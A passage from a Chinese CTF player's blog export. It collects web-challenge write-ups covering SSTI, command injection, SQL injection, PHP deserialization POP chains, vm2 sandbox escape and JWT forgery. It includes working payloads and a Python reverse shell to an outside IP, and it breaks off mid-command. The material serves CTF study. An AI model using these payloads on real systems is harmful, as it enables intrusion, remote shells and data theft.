10、Less-10双引号时间盲注 后面不想打了，这做起来感觉挺奇怪的。。没有ctf那感觉，还是多看看比赛题吧。 后面的计划是每天至少复习前面的五道题并且做一到两道新题，毕竟后面题开始难起来了，做快了也没用。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"DASCTF八月赛学习","slug":"DASCTF八月赛学习","date":"2020-09-07T04:14:07.000Z","updated":"2020-09-08T12:16:39.978Z","comments":true,"path":"2020/09/07/DASCTF八月赛学习/","link":"","permalink":"/2020/09/07/DASCTF八月赛学习/","excerpt":"","text":"一、安恒大学这道题当时没做出来，看了wp才知道是实战改编的，主要是没想到会在邮箱那里存在sql注入，一直在研究那个留言板，以为是ssti或者二次注入，wtcl。 二、ezflask y1ng师傅的payload，保存一下，构造任意字符串说不定以后会遇到。 payload： http://183.129.189.60:10025/?name=?{%%20set%20xhx%20=%20(({%20}|select()|string()|list()).pop(24)|string())%}{%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%}{%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%}%20{%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%}{%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%}%20{%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%}%20{%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}%20{%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%}{%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%}{%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%}{%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%}%20{%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%}{%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%}{%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%}%20{%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%}{%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%}{%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%}%20{%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%}{%%20if%20f%20==%20bul%20%}{%%20for%20a,b%20in%20v.items()%20%}{%%20if%20a%20==%20ev%20%}{{b(pld)}}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%} 三、rceme 无字母数字rce虽然过滤了部分位运算符 但还是漏了一个| 或运算利用或运算符构造playload 调用readfile函数 读取根目录flag 这里就用反引号的二进制位与payload的二进制位对比，得出最后的payload：异或构造字符。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"强网杯2020web部分题解","slug":"强网杯2020web部分题解","date":"2020-09-05T02:48:52.000Z","updated":"2020-09-06T03:43:35.712Z","comments":true,"path":"2020/09/05/强网杯2020web部分题解/","link":"","permalink":"/2020/09/05/强网杯2020web部分题解/","excerpt":"","text":"强网杯没怎么认真打，这里就简单分享一下其中比较简单的三道题的思路。由于本人实力有限，讲的比较基础，希望各位师傅见谅。一、主动。 if里面的正则表示如果参数ip里出现flag那么就会显示flag。 看见system首先想到命令执行，有很多种解法： 1、?ip=127.0.0.1|cat%20fla\\g.php利用linux的反斜杠绕过。 2、?ip=127.0.0.1;cat%20????.php使用通配符绕过。 3、?ip=;cat fl’’ag.php引号绕过。 4、?ip=;cat echo &#39;Li9mbGFnLnBocAo=&#39; | base64 -dbase64编码绕过。比较麻烦，不推荐。 5、?ip=;a=fl;b=ag;cat $a$b.php变量赋值绕过。 还有的就不一一列举了。 二、funhash 首先分析一下源码，需要通过三个阶段，然后var_dump出$row内容。 level1应该是本题最难的点了，如果你搜不到的话。这里给出碰撞脚本供大家参考： 参考链接：https://medium.com/@sbasu7241/hsctf-6-ctf-writeups-a807f0b25ae4 大概跑几分钟就能出结果。 最后提一下原理，因为是弱类型比较，所以可以用科学计数法绕过。 level2和level3就没什么难度了。 level2数组绕过即可。 level3： md5($password,true)先给出答案：content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: ‘or’6]!r,b 当raw的值为true时，返回16位原始二进制格式的字符串。不是普通的二进制（0，1），而是 ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 这种。 上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是” ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c “ 。 ‘ \\ ‘后面的3个字符连同’ \\ ‘算一个字符，比如’ \\xc9 ‘，所以上述一共16个。当然，像’ \\xc9 ‘这种字符会显示乱码。 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’ ‘ ‘字符。6f就是对应‘ o ’。 然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = ‘admin’ and password = ‘’or’6�]��!r,��b’ 为什么password = ‘’or’6�]��!r,��b’的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然这里不能以0开头。 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。（不只是1开头，只要是数字开头都是可以的） payload : ?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop 三、web辅助 分析源码。 Class.php 这里存在着各种类，也是我们构造pop链的关键，我们的目的是为了触发最后的cat /flag common.php 这里面的read，write有与’\\0\\0’, chr(0).””.chr(0)相关的替换操作，还有一个check对我们的序列化的内容进行检查，判断是否存在关键字name，这里也是我们需要绕过的一个地方 Index.php 获取我们传入的username和password，并将其序列化储存 Play.php 在写入序列化的内容之后，访问play.php，如果我们的操作通过了check，然后经过了read的替换操作之后，便会进行反序列化操作。 分析：反推，我们的最终目的是要触发jungle类中的KS方法，从而cat /flag，而触发KS方法得先触发__toString方法，一般来说，在我们使用echo输出对象时便会触发。找了很久才发现是stristr($this-&gt;name, ‘Yasuo’)这个地方会触发。（在5.x版本前，只有echo能触发toString操作，新版本所有的字符串操作都能触发了）接下来，就需要触发gank函数，所以需要利用midsolo的invoke。topsolo类中的TP方法中，使用了name()，如果我们将一个对象赋值给name，这里便是以调用函数的方式调用了一个对象，此时会触发invoke方法。 此时思路就非常的清晰了：topsolo-&gt;destruct()-&gt;TP()-&gt;$name()-&gt;midsolo-&gt;invoke()-&gt;Gank()-&gt;stristr()-&gt;jungle-&gt;__toString()-&gt;KS()-&gt;syttem(‘cat /flag’) 构造POP链： O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D 这还没有结束。首先，由于midsolo中的__wakeup会在反序列化过程中覆盖掉我们的传值，因此我们要将midsolo的1改成2来绕过。（老套路了，序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行） O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D “name”检测绕过 使用十六进制绕过\\6e\\61\\6d\\65，并将s改为S O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D 字符串逃逸 可以看到对象topsolo，midsolo被s:102，所包裹，我们要做的就是题目环境本身的替换字符操作从而达到对象topsolo，midsolo从引号的包裹中逃逸出来 在反序列化操作前，有个read的替换操作，字符数量从5位变成3位，合理构造username的长度，经过了read的替换操作后，最后将”;s:7:”\\0\\0pass”;s:126吃掉，需要吃掉的长度为23，因为5-&gt;3，所以得为2的倍数，需要在password中再填充一个字符C，变成24位，所以我们一共需要构造12个\\0\\0来进行username填充，得到username 在password中补上被吃掉的pass部分，构造password的提交内容 password=C”;s:7:”\\0*\\0pass”;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\\6e\\61\\6d\\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D 最后 flag在play.php。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"buu知识点复习(四)","slug":"buu知识点复习-四","date":"2020-09-02T13:27:03.000Z","updated":"2020-09-05T03:59:43.043Z","comments":true,"path":"2020/09/02/buu知识点复习-四/","link":"","permalink":"/2020/09/02/buu知识点复习-四/","excerpt":"","text":"一、[GYCTF2020]Blacklist–sql注入和强网杯那道题差不多，但是过滤了alter和rename。很明显不是上次那个方法了。这里要用到handler这个东西HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# 二、[De1CTF 2019]SSRF Me–python代码审计这题没什么好记录的知识点，但是我认为是很重要的一题，因为比赛的时候多是这种综合性的代码审计。https://blog.csdn.net/weixin_43900387/article/details/105278192https://www.cnblogs.com/Cl0ud/p/12177116.html研究了两小时，终于全部搞明白了，希望对以后做题的时候有所帮助。 三、[GXYCTF2019]禁止套娃–无参数RCE 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2.过滤了常用的几个伪协议，不能以伪协议读取文件。3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。4.正则匹配掉了et/na/info等关键字，很多函数都用不了。5：eval($_GET[‘exp’]); 典型的无参数RCE 首先需要扫描目录下的文件，这就需要构造：print_r(scandir(‘.’));但怎么实现用函数替换中间的参数呢，这就需要localeconv()，localeconv()自带常量为 . 。current()函数可以返回数组中当前元素的值，所以payload：print_r(scandir(current(localeconv())));flag.php在第四位，next()函数可以读取下一位，但是只能使用一次，因为中间必须是数组形式，所以不能像next(next())这样连续使用。所以还需要用到array_reverse()，交换前后顺序，最后highlight_file输出，payload：highlight_file(next(array_reverse(scandir(current(localeconv()))))); 四、[0CTF 2016]piapiapia–源码分析、php反序列化字符逃逸终于找到字符逃逸的了。源码因为时间原因就不分析了。（这篇博客拖了三天了）直接说利用点吧： 通过www.zip源码泄露得知flag在config.php，所以理论上只要另$profile[‘photo’]的值为config.php就可以读取flag了。 $profile = a:4:{s:5:”phone”;s:11:”12345673845”;s:5:”email”;s:8:”11@q.com“;s:8:”nickname”;s:6:”Troy3e”;s:5:”photo”;s:10:”config.php”;}s:39:”upload/c7350266700fbcdc4ff49fcdf65ec863”;} $profile = a:4:{s:5:”phone”;s:11:”12345673845”;s:5:”email”;s:8:”11@q.com“;s:8:”nickname”;a:1:{i:0;s:1:”1”};s:5:”photo”;s:10:”config.php”;}s:39:”upload/c7350266700fbcdc4ff49fcdf65ec863”;} 但是现在的photo还在nickname里，怎么让$profile[‘photo’]的值为comfig.php呢，这里就要用到字符逃逸。 利用这个正则，where会被替换成hacker，增加了一位，那么输入34个where即可顶掉”};s:5:”photo”;s:10:”config.php”;}，使$profile[‘photo’]的值为config.php。 $profile = a:4:{s:5:”phone”;s:11:”12345673845”;s:5:”email”;s:8:”11@q.com“;s:8:”nickname”;a:1:{i:0;s:204:”wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”};s:5:”photo”;s:10:”config.php”;}s:39:”upload/c7350266700fbcdc4ff49fcdf65ec863”;} 最后注册登录抓包查看即可。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"buu知识点复习(三)","slug":"buu知识点复习-三","date":"2020-08-31T02:08:05.000Z","updated":"2020-09-01T16:38:57.714Z","comments":true,"path":"2020/08/31/buu知识点复习-三/","link":"","permalink":"/2020/08/31/buu知识点复习-三/","excerpt":"","text":"一、[强网杯 2019]高明的黑客–python多线程脚本多线程脚本现在对我来说还是比较困难。估计模仿着勉强能写出来。唯一的问题就是看到有些奇怪的正则表达式还是不知道啥意思，主要是格式要记住。 正则表达式符号大全：https://www.cnblogs.com/yirlin/archive/2006/04/12/373222.html单线程脚本：https://www.cnblogs.com/xhds/p/12289768.html多线程脚本：https://www.cnblogs.com/h3zh1/p/12661892.html单线程写出来应该没什么问题，但是本题如果单线程估计要跑到心态爆炸。 二、[极客大挑战 2019]HardSQL–报错注入首先来重新学习一下报错注入。 报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。 报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。 1、xpath语法错误利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。 0x7e=’~’‘~‘可以换成’#’、’$’等不满足xpath格式的字符extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位这道题就是用的这种方法，两种都写一下：extractvalue：库：username=44&amp;password=1’^extractvalue(1,concat(0x7e,(select(database()))))%23 表：username=44&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))%23 列：username=44&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(‘geek’)))))%23这里用like代替=号，因为被过滤了。 username=44&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(‘H4rDsq1’)))))%23 这里限制了回显位数，且substr被过滤了，要用到另外一个骚操作{left(),right()}playload:username=44&amp;password=1%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23 updatexml：类似 2、concat+rand()+group_by()导致主键重复还没遇到过，后面再说吧。 三、[GXYCTF2019]BabySQli–sql注入当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。username栏：’union select 1,admin’,’e10adc3949ba59abbe56e057f20f883e’#password栏：123456 四、[网鼎杯 2020 青龙组]AreUSerialz–反序列化一个非常简单的反序列化，魔法函数的调用条件要记住。 construct()当一个对象创建时被调用 destruct()当一个对象销毁时被调用toString()当一个对象被当作一个字符串使用 sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用 五、[BUUCTF 2018]Online Tool–PHP escapeshellarg()+escapeshellcmd()https://paper.seebug.org/164/1、传入的参数是：172.17.0.2’ -v -d a=12、经过escapeshellarg处理后变成了’172.17.0.2’\\’’ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。3、经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a=1\\’，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php4、最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a=1\\’，由于中间的\\被解释为\\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1’，即向172.17.0.2\\发起请求，POST 数据为a=1’。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"buu知识点复习(二)","slug":"buu知识点复习-二","date":"2020-08-30T02:03:39.000Z","updated":"2020-08-30T14:50:07.630Z","comments":true,"path":"2020/08/30/buu知识点复习-二/","link":"","permalink":"/2020/08/30/buu知识点复习-二/","excerpt":"","text":"一、[SUCTF 2019]CheckIn–upload当时第一次见到修改.user.ini的题，但是看了好多wp都没有讲怎么会想到用这个的。 通过给上传脚本加上相应的幻数头字节就可以绕过exif_imagetype()：JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF(相当于文本的GIF89a)：47 49 46 38 39 61PNG： 89 50 4E 47 &lt;?被过滤这样绕过： 二、[CISCN2019 华北赛区 Day2 Web1]Hack World–python脚本python是要重点学习的地方，因为第一遍做的时候只是看懂了而已，这次要做到能自己写出来。以这道题为例，在已经告诉我们表和列的情况下，其实是一个非常简单的二分法脚本。 一些注意点：1、import time应该是想加延时函数来针对buu的waf的，但这里没有用到。2、记住一些书写格式。比如payload={“xx”:””}html=requests.post(url,data=payload)3、判断。0^0为0，0^1为1。1的时候会出现”Hello”。 三、[ZJCTF 2019]NiZhuanSiWei–php记录一下不常用的php伪协议if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 四、[BJDCTF2020]Easy MD5select * from ‘admin’ where password=md5($pass,true) 强网杯也遇到了这个知识点，可惜前面md4没撞出来，太菜了。 为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。还有其他的答案，就不一一列举了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"暑假总结","slug":"暑假总结","date":"2020-08-29T12:38:07.000Z","updated":"2020-08-29T13:50:41.228Z","comments":true,"path":"2020/08/29/暑假总结/","link":"","permalink":"/2020/08/29/暑假总结/","excerpt":"","text":"这个暑假主要干了以下两件事。一、BUU刷题。到现在为止大概也做了100多道题了，但是一到比赛还是很菜。想了下原因，应该是很多基础的知识还没有弄明白，一到比赛没有wp的引导之后，做题就很困难。所以现在正在总结之前遇到的知识点，加深印象。 二、招新平台搭建。平台搭建还是踩了很多坑的，踩坑过程就不细讲了。这里就简单介绍一下招新平台。服务器是阿里云白嫖的学生机，所以访问会比较慢，不知道到时候够不够用。主题采用的是H1ve，最开始用的是CTFD，后来感觉太单调了，就换了一个已经自定义过的。最大的坑就是这个主题，装的时候各种报错，研究了一天才弄好。关于招新题目，web我已经出了12个了，加起来应该有15个左右，后面会再准备一点备用。misc和crypto还是不够多。 地址：http://www.henuctf.com:8000/","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"buu知识点复习","slug":"buu知识点复习","date":"2020-08-29T05:39:09.000Z","updated":"2020-08-29T09:38:02.454Z","comments":true,"path":"2020/08/29/buu知识点复习/","link":"","permalink":"/2020/08/29/buu知识点复习/","excerpt":"","text":"比赛打下来唯一的感觉就是基础知识不扎实，所以就复习一下之前做过的题目，对我认为比较重要的知识点做一个总结。一、[强网杯 2019]随便注–堆叠注入原来改名称那个payload一直有问题，这里新学习了一个姿势：预编译预编译相关语法如下： set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句 -1’;set @sql = CONCAT(‘se’,’lect * from 1919810931114514;’);prepare stmt from @sql;EXECUTE stmt;# 拆分开来如下-1’;set @sql = CONCAT(‘se’,’lect * from 1919810931114514;’);prepare stmt from @sql;EXECUTE stmt;# 回显：strstr($inject, “set”) &amp;&amp; strstr($inject, “prepare”) 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。 -1’;Set @sql = CONCAT(‘se’,’lect * from 1919810931114514;’);Prepare stmt from @sql;EXECUTE stmt;# 二、[RoarCTF 2019]Easy Calc–php 当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。 num被限制了，那么’ num’呢，在num前面加了空格。waf就管不着了，因为waf只是限制了num，waf并没有限制’ num’，当php解析的时候，又会把’ num’前面的空格去掉在解析，利用这点来上传非法字符。var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 三、[GXYCTF2019]Ping Ping Ping–命令执行变量拼接过滤空格，可以用${IFS}$代替过滤{}，用$IFS$1代替 ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\\，所以甚至可以ca\\t /fl\\ag 符号：；分号叫顺序执行 本题payload?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 后面还有很多绕过方式，取反、自增等等，碰到的时候再去总结吧。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HFCTF2020]JustEscape","slug":"HFCTF2020-JustEscape","date":"2020-08-26T14:23:46.000Z","updated":"2020-08-26T15:52:58.507Z","comments":true,"path":"2020/08/26/HFCTF2020-JustEscape/","link":"","permalink":"/2020/08/26/HFCTF2020-JustEscape/","excerpt":"","text":"访问run.php： 看似很简单的代码，根据首页的提示，猜测这不只是php。输入Error().stack根据回显得到，这是一个JS的vm2，而且经过测试许多关键字都被过滤搜索可得 vm2 最新沙盒逃逸 poc payload：(function (){TypeError[${${prototyp}e}][${${get_proces}s}] = f=&gt;f${${constructo}r}();try{Object.preventExtensions(Buffer.from()).a = 1;}catch(e){return e${${get_proces}s}=&gt;{}).mainModule${${requir}e}${${exe}cSync}.toString();}})() 这个地方暂时就不去深究了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[网鼎杯2018]Unfinish","slug":"网鼎杯2018-Unfinish","date":"2020-08-25T13:02:32.000Z","updated":"2020-08-25T15:17:55.062Z","comments":true,"path":"2020/08/25/网鼎杯2018-Unfinish/","link":"","permalink":"/2020/08/25/网鼎杯2018-Unfinish/","excerpt":"","text":"进去是个login.php，提示用户名或密码错误。猜测有register.php，成功访问。登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 二次注入所以构造 payload 如下： 进行两次hex解码后得到数据库名为web 至于为什么用两次hex： 使用的脚本：https://blog.csdn.net/bmth666/article/details/105499305要我写肯定写不出这么。。复杂？的脚本。。 但是自己的思路一直出问题，不知道是哪里有问题。。感觉理论上行得通啊： 跑是跑出来了，但是感觉不完整，也有可能是多了。 ——————————————————————后来研究了一下，我这个（其实也不是自己的）简单思路其实也是对的，只是输出的时候有点乱，当时可能少选了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GKCTF2020]EZ三剑客-EzNode","slug":"GKCTF2020-EZ三剑客-EzNode","date":"2020-08-22T14:03:06.000Z","updated":"2020-08-22T15:23:20.376Z","comments":true,"path":"2020/08/22/GKCTF2020-EZ三剑客-EzNode/","link":"","permalink":"/2020/08/22/GKCTF2020-EZ三剑客-EzNode/","excerpt":"","text":"最近两个比赛的题都不会做。。。太烦了，就是没思路。。。不多说了，刷题。 对node.js还不是很熟,所以记录一下。关键代码 这一大段主要是在/eval这个路由下，首先他先设置delay的默认值，我们可以去到这个路由把delay的值传过去，然后他会比较传过去的值和默认值，选较大的一方作为自己的值。然后就是设置超时，将秒数delay作为超时时限，超时了就进到下一个路由 可是我们无论怎么发都不可能超过6秒问题出在了SetTimeout这个函数存在溢出 浏览器内部使用32位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟2147483647秒。只要大于2147483647,就会发生溢出,就可以绕过那个时间限制，进入下一个路由 他这里要我们post传参e,，就是要让我们沙盒逃逸开头：const saferEval = require(‘safer-eval’); // 2019.7/WORKER1 找到一个很棒的库 搜一波这个库的漏洞，搜到一个CVE，直接套用代码即可cat /flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"settime溢出+沙盒逃逸","slug":"settime溢出-沙盒逃逸","permalink":"/tags/settime溢出-沙盒逃逸/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[Zer0pts2020]Can you guess it?","slug":"Zer0pts2020-Can-you-guess-it","date":"2020-08-18T13:05:56.000Z","updated":"2020-08-18T14:15:25.162Z","comments":true,"path":"2020/08/18/Zer0pts2020-Can-you-guess-it/","link":"","permalink":"/2020/08/18/Zer0pts2020-Can-you-guess-it/","excerpt":"","text":"可以很明显的看到flag的获取方式，可是仔细看下就知道不太可能实现。。。64位的随机数，应该只是用来吓唬人的。 那咋办呢，当然是查看wp了。回到开头那一段 我们要造成任意文件读取，需要绕过正则匹配和basename $_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。 但是正则过滤了/config.php/*$/i。从 https://bugs.php.net/bug.php?id=62119 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：var_dump(basename(“xffconfig.php”)); // =&gt; config.phpvar_dump(basename(“config.php/xff”)); // =&gt; config.php所以这样就能绕过正则了，payload：/index.php/config.php/%ff?source（不可见字符来进行绕过，而超出ascii识别的访问，basename能够正常访问config.php）","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HFCTF2020]EasyLogin","slug":"HFCTF2020-EasyLogin","date":"2020-08-17T13:47:25.000Z","updated":"2020-08-17T15:23:28.330Z","comments":true,"path":"2020/08/17/HFCTF2020-EasyLogin/","link":"","permalink":"/2020/08/17/HFCTF2020-EasyLogin/","excerpt":"","text":"f12查看源码找到/static/js/app.js 后面根据大佬所述得知靠经验读取controllers/api.js 这里有注册、登陆、flag、登出四个路由，可以得知admin登陆后即可获得flag 最开始在抓包的时候其实就已经知道这个思路了。因为注册的时候用admin注册会提示错误，并且加上bp中这几串很明显的字符串就知道是jwt伪造，之前已经遇到过一次了，所以这次虽然没有看源码也能猜到思路。 形式：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.（这里有一个点）eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.（这里也有一个点）TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ第一个点前为header，第二个点前为payload，第二个点后为signture一个攻击点：当header中的alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。 此题的利用方式是：将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为空时，jsonwebtoken会采用algorithm为none进行解密。 所以我们得构造一个jwt，将algorithm设为空，将uername设为admin，那么secretid怎么设置才能使secret取出来为空呢？ 这里我们还需绕过secretid的一个验证，不能为undefined，不能为null。JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过，这里用了小数 安装jwt pip install pyjwt 把生成的值替换authorization的值就通过验证了 然后再抓包/api/flag，改一下cookie即可。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"jwt伪造","slug":"jwt伪造","permalink":"/tags/jwt伪造/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[V&N2020 公开赛]CHECKIN","slug":"V-N2020-公开赛-CHECKIN","date":"2020-08-17T07:34:29.000Z","updated":"2020-08-17T13:27:43.434Z","comments":true,"path":"2020/08/17/V-N2020-公开赛-CHECKIN/","link":"","permalink":"/2020/08/17/V-N2020-公开赛-CHECKIN/","excerpt":"","text":"整理源码得 shell()中有命令执行函数，可惜没有回显。 知识点在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag.txt）在/proc/[pid]/fd下还是会存在,所以我们还是可以看flag,txt的。 网上找的一个弹shell payload的总结：https://www.cnblogs.com/20175211lyz/p/12397933.html 随意监听一个端口： nc -lvp 1234 payload：shell?c=python3 -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘174.0.63.198’,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]) 然后就可以命令执行了。 查看/proc/[pid[/fd 里的文件由于有很多[pid]我们可以直接用*来代替，省的一步一步去找 cat 